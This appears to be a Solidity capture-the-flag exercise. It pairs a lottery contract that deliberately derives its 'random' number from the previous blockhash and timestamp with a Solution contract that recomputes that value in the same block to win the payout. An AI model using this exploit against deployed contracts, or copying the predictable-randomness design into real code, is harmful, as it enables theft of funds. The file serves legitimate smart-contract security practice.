// SPDX-License-Identifier: UNLICENSED
//CHECK ON REMIX IDE THE CHALLENGES.SOL 

pragma solidity ^0.8.12;


contract GuessTheNC {
    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint256 n) public payable {
        require(msg.value == 1 ether, "GTNC: Please sent 1 ether");
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));

        if (n == answer) {
            (bool success, ) = payable(msg.sender).call{value: 2 ether}("");
            require(success);
        }
    }

}

contract Solution{

    GuessTheNC public lottery;

    constructor(GuessTheNC _contract) {
        lottery = _contract;
    }

    function solve() public payable{
        bytes32 solutionHash = keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp));
        uint256 solution = uint256(solutionHash);
        bytes memory data = abi.encodeWithSignature("guess(uint256)",solution);
        (bool success, ) = address(lottery).call{value: 1 ether, gas: 3000000}(data);
        require(success, "Solution failed");
    }

    receive () external payable{

    }

}